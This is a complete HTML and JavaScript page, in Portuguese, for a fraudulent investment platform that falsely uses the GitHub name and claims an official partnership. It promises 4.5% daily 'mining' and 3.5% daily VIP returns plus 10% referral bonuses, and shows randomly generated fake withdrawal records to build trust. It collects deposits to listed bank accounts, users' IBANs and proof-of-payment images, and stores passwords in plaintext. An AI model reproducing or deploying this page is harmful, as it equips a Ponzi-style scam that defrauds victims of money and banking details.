<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GITHUB - Investment</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #1e293b; margin: 0; }
        .card-gh { border-radius: 1.5rem; background: white; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .janela-saques { height: 180px; overflow: hidden; background: #1e40af; border-radius: 1.5rem; border: 4px solid #3b82f6; position: relative; z-index: 10; }
        .scroll-saques { animation: subirSaques 25s linear infinite; }
        @keyframes subirSaques { 0% { transform: translateY(0); } 100% { transform: translateY(-50%); } }
        .rodape-info { background: #0f172a; color: #38bdf8; padding: 12px 0; overflow: hidden; white-space: nowrap; position: fixed; bottom: 75px; width: 100%; z-index: 5; }
        .news-track { display: inline-block; animation: track 20s linear infinite; font-weight: 900; font-size: 11px; text-transform: uppercase; }
        @keyframes track { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .nav-active { color: #2563eb !important; background: #eff6ff; border-top: 3px solid #2563eb; }
        .btn-acao { transition: all 0.2s; font-weight: 900; text-transform: uppercase; border-radius: 1rem; }
        .btn-acao:active { transform: scale(0.95); }
        .hidden { display: none !important; }
        .vip-card-active { border: 2px solid #22c55e; position: relative; }
        .vip-tag { position: absolute; top: 10px; right: 10px; background: #22c55e; color: white; font-size: 8px; padding: 2px 8px; border-radius: 10px; font-weight: 900; }
    </style>
</head>
<body>
<div id="portal-entrada" class="min-h-screen bg-white p-6 flex flex-col relative">
    <div class="absolute top-6 right-6">
        <select class="text-[10px] font-black border rounded p-2 bg-slate-50 outline-none">
            <option>Português</option><option>Français</option><option>English</option>
        </select>
    </div>
    <div class="text-center mb-8 mt-10">
        <i class="fab fa-github text-7xl text-slate-900 mb-2"></i>
        <h1 class="text-3xl font-black italic tracking-tighter">GITHUB</h1>
        <p class="text-[9px] font-bold text-blue-600 uppercase tracking-widest">Global Digital Mining</p>
    </div>
    <div id="box-login" class="space-y-4">
        <input type="number" id="l-tel" placeholder="Número de Telefone" class="w-full p-5 bg-slate-50 rounded-2xl border outline-none font-bold text-center">
        <input type="password" id="l-pw" placeholder="Senha de 6 dígitos" class="w-full p-5 bg-slate-50 rounded-2xl border outline-none font-bold text-center">
        <button onclick="fazerLogin()" class="w-full bg-slate-900 text-white py-5 btn-acao shadow-lg">Entrar</button>
        <p class="text-center text-xs font-bold text-slate-400">Novo aqui? <span onclick="irRegisto(false)" class="text-blue-600 underline">Criar Conta</span></p>
    </div>
    <div id="box-reg" class="hidden space-y-4">
        <input type="number" id="r-tel" placeholder="Seu Contacto" class="w-full p-5 bg-slate-50 rounded-2xl border outline-none font-bold text-center">
        <input type="password" id="r-pw" placeholder="Criar Senha (6 dígitos)" class="w-full p-5 bg-slate-50 rounded-2xl border outline-none font-bold text-center">
        <input type="password" id="r-pw2" placeholder="Confirmar Senha" class="w-full p-5 bg-slate-50 rounded-2xl border outline-none font-bold text-center">
        <button onclick="fazerRegisto()" class="w-full bg-blue-600 text-white py-5 btn-acao shadow-lg">Finalizar Registo</button>
        <button onclick="irRegisto(true)" class="w-full text-slate-400 text-[10px] font-black uppercase py-2">Voltar ao Login</button>
    </div>
    <div class="mt-auto pt-6 border-t text-[10px] space-y-3 font-bold">
        <div class="flex items-center gap-2 text-blue-600"><i class="fas fa-shield-alt"></i> <span>SEGURANÇA SSL DE ALTA CAMADA</span></div>
        <div class="flex items-center gap-2 text-slate-500"><i class="fas fa-handshake"></i> <span>PARCERIA OFICIAL GITHUB INVEST</span></div>
    </div>
</div>
<div id="app-principal" class="hidden min-h-screen">
    <div id="conteudo" class="p-5 pb-44"></div>
    <div id="barra-rolante" class="rodape-info hidden"><div class="news-track">🔥 GITHUB: MINERAÇÃO 4.5% DIÁRIO • VIP 3.5% AUTOMÁTICO • BÓNUS EQUIPA 10% • SAQUES RÁPIDOS 🔥</div></div>
    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t flex justify-around p-2 z-50 shadow-2xl">
        <button id="n-home" onclick="ir('home')" class="flex flex-col items-center gap-1 text-slate-400 font-black text-[9px] uppercase py-2"><i class="fas fa-home text-xl"></i>Home</button>
        <button id="n-invest" onclick="ir('invest')" class="flex flex-col items-center gap-1 text-slate-400 font-black text-[9px] uppercase py-2"><i class="fas fa-microchip text-xl"></i>Investir</button>
        <button id="n-vip" onclick="ir('vip')" class="flex flex-col items-center gap-1 text-slate-400 font-black text-[9px] uppercase py-2"><i class="fas fa-crown text-xl"></i>VIP</button>
        <button id="n-team" onclick="ir('team')" class="flex flex-col items-center gap-1 text-slate-400 font-black text-[9px] uppercase py-2"><i class="fas fa-users text-xl"></i>Equipa</button>
        <button id="n-perfil" onclick="ir('perfil')" class="flex flex-col items-center gap-1 text-slate-400 font-black text-[9px] uppercase py-2"><i class="fas fa-user-circle text-xl"></i>Perfil</button>
    </nav>
    </div>
    <div id="toast" class="fixed top-10 left-1/2 -translate-x-1/2 bg-slate-900 text-white px-8 py-4 rounded-2xl font-black text-[10px] uppercase hidden z-[9999] shadow-2xl"></div>
<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, getDoc, setDoc, updateDoc, arrayUnion, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
    const firebaseConfig = { 
        apiKey: "AIzaSyA03WW6zrf79PsZY6KvaxGRsGFY1AEFCYs", authDomain: "fir-b8708.firebaseapp.com", 
        projectId: "fir-b8708", storageBucket: "fir-b8708.firebasestorage.app", 
        messagingSenderId: "174524990208", appId: "1:174524990208:web:eb08738fdd7cd1cd98a9e5" 
    };
    const db = getFirestore(initializeApp(firebaseConfig));
    let userID = null, imgBase64 = null;
    const notar = (m) => { const t=document.getElementById('toast'); t.innerText=m; t.classList.remove('hidden'); setTimeout(()=>t.classList.add('hidden'), 3000); };
    window.irRegisto = (r) => { document.getElementById('box-login').classList.toggle('hidden', !r); document.getElementById('box-reg').classList.toggle('hidden', r); };
    window.fazerLogin = async () => {
        const tel=document.getElementById('l-tel').value, pw=document.getElementById('l-pw').value;
        const s = await getDoc(doc(db, "usuarios", tel));
        if(s.exists() && s.data().pw === pw) {
            userID = tel; document.getElementById('portal-entrada').classList.add('hidden');
            document.getElementById('app-principal').classList.remove('hidden');
            const hj = new Date().toLocaleDateString(), u = s.data();
            if(u.lastVipDay !== hj && u.vips?.length > 0) {
                let r = 0; const p = [0, 15000, 45000, 90000, 180000, 360000, 720000];
                u.vips.forEach(v => r += p[v]*0.035);
                await updateDoc(doc(db,"usuarios",userID),{saldo:increment(r),r_total:increment(r),r_hoje:r,r_ontem:u.r_hoje,lastVipDay:hj,extrato:arrayUnion({data:new Date().toLocaleString(),valor:r.toFixed(0),desc:"Rendimento VIP Automático",status:"Aprovado"})});
            } ir('home');
        } else notar("DADOS INCORRETOS");
    };
    window.fazerRegisto = async () => {
        const t=document.getElementById('r-tel').value, p=document.getElementById('r-pw').value, p2=document.getElementById('r-pw2').value;
        if(p.length !== 6 || p !== p2) return notar("SENHA INVÁLIDA");
        const ref = doc(db, "usuarios", t); if((await getDoc(ref)).exists()) return notar("NÚMERO EXISTENTE");
        const pad = new URLSearchParams(window.location.search).get('ref');
        await setDoc(ref, {pw:p,saldo:0,r_total:0,r_hoje:0,r_ontem:0,investido:0,vips:[],extrato:[],convidados:0,padrinho:pad,banco:null});
        notar("SUCESSO!"); location.reload();
    };
    window.ir = async (pg) => {
        const view = document.getElementById('conteudo'), s = await getDoc(doc(db, "usuarios", userID)), u = s.data();
        document.querySelectorAll('nav button').forEach(b => b.classList.remove('nav-active'));
        if(document.getElementById('n-'+pg)) document.getElementById('n-'+pg).classList.add('nav-active');
        document.getElementById('barra-rolante').classList.toggle('hidden', pg !== 'home');
        if(pg === 'home') {
            const fks = Array.from({length: 25}, () => `<div class="p-3 border-b border-white/10 flex justify-between text-[10px] text-white font-black italic"><span>9xx***${Math.floor(Math.random()*899+100)}</span><span class="text-blue-200">Sacou ${(Math.random()*15000+300).toFixed(0)} KZ</span></div>`).join('');
            view.innerHTML = `<div class="flex justify-between items-center mb-6"><div class="flex items-center gap-2"><i class="fab fa-github text-2xl"></i><b class="italic text-xl">GITHUB</b></div><b class="text-[9px] bg-slate-900 text-white px-2 py-1 rounded">ID: ${userID}</b></div>
                <div class="card-gh p-8 bg-gradient-to-br from-blue-600 to-blue-800 text-white mb-6">
                    <p class="text-[10px] font-black opacity-60">SALDO TOTAL</p><h2 class="text-4xl font-black my-2">${u.saldo.toLocaleString()} KZ</h2>
                    <div class="grid grid-cols-3 gap-2 mt-8">
                        <button onclick="ir('dep')" class="bg-white text-blue-600 py-4 btn-acao text-[9px]">Depósito</button>
                        <button onclick="notar('Fundo para breve')" class="bg-blue-900 text-white py-4 btn-acao text-[9px]">Fundo</button>
                        <button onclick="ir('saq')" class="bg-white text-blue-600 py-4 btn-acao text-[9px]">Saque</button>
                    </div>
                </div><div class="janela-saques shadow-inner"><div class="scroll-saques">${fks}${fks}</div></div>`;
        }
        if(pg === 'invest') {
            view.innerHTML = `<div class="card-gh p-8 text-center mb-6"><b class="text-4xl font-black text-blue-600 italic">4.5% / DIA</b><p class="text-[11px] font-black mt-2">INVESTIDO: ${u.investido} KZ</p></div>
                <input type="number" id="v-inv" placeholder="MÍNIMO 100 KZ" class="w-full p-5 bg-white rounded-2xl mb-4 font-black text-center text-xl outline-none border-2">
                <div class="grid grid-cols-2 gap-3">
                    <button onclick="investir()" class="bg-slate-900 text-white py-5 btn-acao text-[10px]">Investir</button>
                    <button onclick="coletarMin()" class="bg-blue-600 text-white py-5 btn-acao text-[10px]">Receber Comissão</button>
                </div><button onclick="ir('home')" class="w-full mt-10 text-slate-400 font-black text-xs">SAIR</button>`;
        }
        if(pg === 'vip') {
            const p = [15000, 45000, 90000, 180000, 360000, 720000];
            view.innerHTML = `<div class="card-gh p-6 bg-slate-900 text-white flex justify-between items-center mb-6"><div class="font-black text-xs uppercase">Check-in Diário<br><small class="text-blue-400">+ 4 KZ HOJE</small></div><button onclick="checkin()" class="bg-blue-600 px-6 py-3 rounded-xl font-black text-[10px]">COLETAR</button></div>
                <div class="space-y-4">${p.map((val, i) => { const n=i+1, ativo=u.vips?.includes(n); return `<div class="card-gh p-5 flex justify-between items-center ${ativo?'vip-card-active':''}">${ativo?'<span class="vip-tag">ATIVADO</span>':''}<div><b class="text-[10px] text-slate-400">VIP 0${n}</b><br><b class="text-lg font-black text-blue-600">${val.toLocaleString()} KZ</b><br><small class="text-[9px] font-bold text-green-600">Renda: 3.5% (${(val*0.035).toFixed(0)} KZ/Dia)</small></div><button onclick="ativarVip(${n}, ${val})" class="${ativo?'bg-green-100 text-green-600':'bg-slate-900 text-white'} px-6 py-4 rounded-xl text-[10px] font-black uppercase">${ativo?'ATIVO':'ATIVAR'}</button></div>`}).join('')}</div>`;
        }
        if(pg === 'team') {
            view.innerHTML = `<div class="card-gh p-8 bg-slate-900 text-white mb-6"><p class="text-[9px] font-black opacity-50 mb-1 uppercase">Link de Convite</p><div class="bg-white/10 p-4 rounded-xl text-[10px] break-all font-bold mb-4">https://github-invest.app/?ref=${userID}</div><div class="grid grid-cols-2 gap-4 text-center"><div><p class="text-[9px] opacity-50">CONVIDADOS</p><b class="text-3xl font-black">${u.convidados || 0}</b></div><div><p class="text-[9px] opacity-50">COMISSÃO</p><b class="text-3xl text-green-400 font-black">10%</b></div></div></div>
                <div class="card-gh p-6 font-bold text-xs space-y-4 text-slate-500 uppercase"><h3 class="text-blue-600 font-black">Benefícios Equipa</h3><p>Ganhe 10% instantâneo sempre que um convidado direto investir 1.000 KZ ou mais em VIP ou Mineração.</p></div><button onclick="ir('home')" class="w-full mt-10 text-slate-400 font-black text-xs uppercase">Sair</button>`;
        }
        if(pg === 'perfil') {
            view.innerHTML = `<div class="grid grid-cols-3 gap-2 mb-6 text-center uppercase"><div class="card-gh p-4"><p class="text-[8px] opacity-40">Hoje</p><b class="text-xs font-black text-blue-600">${u.r_hoje}</b></div><div class="card-gh p-4"><p class="text-[8px] opacity-40">Ontem</p><b class="text-xs font-black">${u.r_ontem}</b></div><div class="card-gh p-4"><p class="text-[8px] opacity-40">Total</p><b class="text-xs font-black text-green-600">${u.r_total}</b></div></div>
                <div class="space-y-2"><button onclick="ir('add-c')" class="w-full card-gh p-5 text-left font-black text-[11px] uppercase flex justify-between">Adicionar Conta <i class="fas fa-university"></i></button><button onclick="ir('ext')" class="w-full card-gh p-5 text-left font-black text-[11px] uppercase flex justify-between">Extrato <i class="fas fa-list"></i></button><button onclick="ir('empresa')" class="w-full card-gh p-5 text-left font-black text-[11px] uppercase flex justify-between">Empresa <i class="fas fa-building"></i></button>
                <button onclick="window.open('https://chat.whatsapp.com/Ji5xHNtU5gf0QNUp8HjMVe')" class="w-full card-gh p-5 text-left font-black text-[11px] text-green-600 flex justify-between">Atendimento Online <i class="fab fa-whatsapp"></i></button><button onclick="notar('App em breve')" class="w-full card-gh p-5 text-left font-black text-[11px] uppercase flex justify-between">Baixar APP <i class="fas fa-download"></i></button>
                <button onclick="location.reload()" class="w-full p-6 text-red-500 font-black uppercase mt-10">Encerrar Sessão</button></div>`;
        }
        if(pg === 'empresa') {
            view.innerHTML = `<div class="card-gh p-8 space-y-6"><h2 class="text-xl font-black italic border-b pb-2">GITHUB INVESTMENTS</h2><p class="text-xs text-slate-500 font-bold uppercase"><b>Objetivo:</b> Expandir a mineração digital em África.<br><br><b>Área:</b> Cloud Computing & Assets.<br><br><b>Regras:</b> Saques 24/7. Taxa 10%.</p><button onclick="ir('perfil')" class="w-full bg-slate-900 text-white py-4 btn-acao">Voltar</button></div>`;
        }
        if(pg === 'add-c') {
            view.innerHTML = `<div class="card-gh p-8 space-y-4"><select id="b-nome" class="w-full p-5 bg-slate-50 rounded-xl font-black border"><option>BFA</option><option>BCI</option><option>BAI</option></select><input id="b-tit" placeholder="Nome Completo" class="w-full p-5 bg-slate-50 rounded-xl font-black border uppercase"><input id="b-iban" placeholder="IBAN (21 dígitos)" maxlength="21" class="w-full p-5 bg-slate-50 rounded-xl font-black border"><button onclick="salvarBanco()" class="w-full bg-blue-600 text-white py-5 btn-acao">Gravar Dados</button><button onclick="ir('perfil')" class="w-full text-[10px] font-black uppercase text-slate-400">Sair</button></div>`;
        }
        if(pg === 'dep') {
            view.innerHTML = `<div class="card-gh p-6 mb-6 text-[11px] font-black uppercase space-y-4"><div>BFA: 0006 0000 5460 3875 3011 7</div><div>BCI: 0005 0000 6987 5212 1019 7</div><div>VIA EXPRESS: 921054122</div></div><input type="number" id="v-dep" placeholder="VALOR MÍN" class="w-full p-5 bg-white rounded-2xl mb-4 font-black text-center text-xl outline-none border-2"><div class="card-gh p-8 text-center relative border-4 border-dashed border-blue-100 mb-6"><span id="t-file" class="text-[10px] font-black text-blue-600 uppercase">selecionar comprovante</span><input type="file" onchange="prev(this)" class="absolute inset-0 opacity-0"><img id="p-img" class="mt-4 hidden max-h-48 mx-auto rounded-lg"></div><button onclick="enviarDep()" class="w-full bg-blue-600 text-white py-5 btn-acao">Enviar Comprovante</button>`;
        }
        if(pg === 'saq') {
            const ib = u.banco?.i || "NÃO CONFIGURADO"; view.innerHTML = `<div class="card-gh p-8 text-center"><p class="text-[9px] font-black opacity-30 mb-2 uppercase">IBAN de Destino</p><b class="text-blue-600 block mb-6">${ib}</b><input type="number" id="v-saq" oninput="document.getElementById('lq').innerText = (this.value*0.9).toFixed(0) + ' KZ'" placeholder="VALOR" class="w-full p-6 rounded-3xl text-center font-black text-4xl outline-none border-2 mb-4 bg-slate-50"><div class="p-5 bg-slate-900 text-white rounded-2xl flex justify-between font-black text-xs uppercase"><span>Valor Líquido:</span><b id="lq" class="text-green-400">0 KZ</b></div><button onclick="sacar()" class="w-full bg-blue-600 text-white py-6 btn-acao mt-6">Levantar Dinheiro</button></div>`;
        }
        if(pg === 'ext') {
            view.innerHTML = `<h3 class="font-black text-xs mb-4 uppercase text-blue-600 italic">Extrato Financeiro</h3>` + u.extrato.slice().reverse().map(e => `<div class="card-gh p-4 mb-2 border-l-8 ${e.status==='Aprovado'||e.status==='Pago'?'border-green-500':'border-blue-500'} flex justify-between items-center text-[10px] font-black uppercase"><div>${e.desc}<br><span class="${e.status==='Aprovado'||e.status==='Pago'?'text-green-600':'text-orange-500'}">${e.status}</span></div><b class="text-blue-600">${e.valor} KZ</b></div>`).join('');
        }
    };
    window.prev=(i)=>{const f=new FileReader();f.onload=(e)=>{imgBase64=e.target.result;document.getElementById('p-img').src=imgBase64;document.getElementById('p-img').classList.remove('hidden');document.getElementById('t-file').innerText='CARREGADO';};f.readAsDataURL(i.files[0]);};
    window.enviarDep=async()=>{const v=parseFloat(document.getElementById('v-dep').value);if(v<100||!imgBase64)return notar("DADOS INVÁLIDOS");await updateDoc(doc(db,"usuarios",userID),{extrato:arrayUnion({data:new Date().toLocaleString(),valor:v,desc:"Depósito solicitado",status:"Em análise",foto:imgBase64})});notar("ENVIADO!");ir('home');};
    window.investir=async()=>{const v=parseFloat(document.getElementById('v-inv').value);const s=await getDoc(doc(db,"usuarios",userID));if(v<100||s.data().saldo<v)return notar("SALDO INSUFICIENTE");await updateDoc(doc(db,"usuarios",userID),{saldo:increment(-v),investido:increment(v),extrato:arrayUnion({data:new Date().toLocaleString(),valor:v,desc:"Investimento Mineração",status:"Aprovado"})});if(v>=1000)await pagarBonus(v);notar("SUCESSO!");ir('invest');};
    window.ativarVip=async(n,v)=>{const s=await getDoc(doc(db,"usuarios",userID));if(s.data().vips.includes(n))return notar("VIP JÁ ATIVO");if(s.data().saldo<v)return notar("SALDO INSUFICIENTE");if(n>1 && !s.data().vips.includes(n-1)) return notar("ATIVE O VIP ANTERIOR");await updateDoc(doc(db,"usuarios",userID),{saldo:increment(-v),vips:arrayUnion(n),extrato:arrayUnion({data:new Date().toLocaleString(),valor:v,desc:"Ativação VIP 0"+n,status:"Aprovado"})});if(v>=1000)await pagarBonus(v);notar("VIP ATIVADO!");ir('vip');};
    const pagarBonus=async(v)=>{const s=await getDoc(doc(db,"usuarios",userID));const u=s.data();if(u.padrinho){const b=v*0.1;await updateDoc(doc(db,"usuarios",u.padrinho),{saldo:increment(b),r_total:increment(b),extrato:arrayUnion({data:new Date().toLocaleString(),valor:b.toFixed(0),desc:"Bónus de Convite",status:"Aprovado"})});}};
    window.coletarMin=async()=>{const hj=new Date().toLocaleDateString();const s=await getDoc(doc(db,"usuarios",userID));const u=s.data();if(u.lastMine===hj||u.investido<100)return notar("COLETA INDISPONÍVEL");const g=u.investido*0.045;await updateDoc(doc(db,"usuarios",userID),{saldo:increment(g),r_total:increment(g),r_hoje:g,lastMine:hj,extrato:arrayUnion({data:hj,valor:g.toFixed(0),desc:"Renda Mineração",status:"Aprovado"})});notar("COMISSÃO RECEBIDA!");ir('invest');};
    window.checkin=async()=>{const hj=new Date().toLocaleDateString();const s=await getDoc(doc(db,"usuarios",userID));if(s.data().lastCheck===hj)return notar("JÁ FEITO");await updateDoc(doc(db,"usuarios",userID),{saldo:increment(4),r_total:increment(4),lastCheck:hj,extrato:arrayUnion({data:hj,valor:4,desc:"Check-in Diário",status:"Aprovado"})});notar("+ 4 KZ!");ir('vip');};
    window.sacar=async()=>{const v=parseFloat(document.getElementById('v-saq').value);const s=await getDoc(doc(db,"usuarios",userID));if(v<300||s.data().saldo<v)return notar("SALDO INSUFICIENTE");await updateDoc(doc(db,"usuarios",userID),{saldo:increment(-v),extrato:arrayUnion({data:new Date().toLocaleString(),valor:(v*0.9).toFixed(0),desc:"Saque solicitado",status:"Pendente"})});notar("PEDIDO ENVIADO!");ir('home');};
    window.salvarBanco=async()=>{const i=document.getElementById('b-iban').value;if(i.length<21)return notar("IBAN INVÁLIDO");await updateDoc(doc(db,"usuarios",userID),{banco:{b:document.getElementById('b-nome').value,i:i,t:document.getElementById('b-tit').value}});notar("GUARDADO!");ir('perfil');};
</script></body></html>
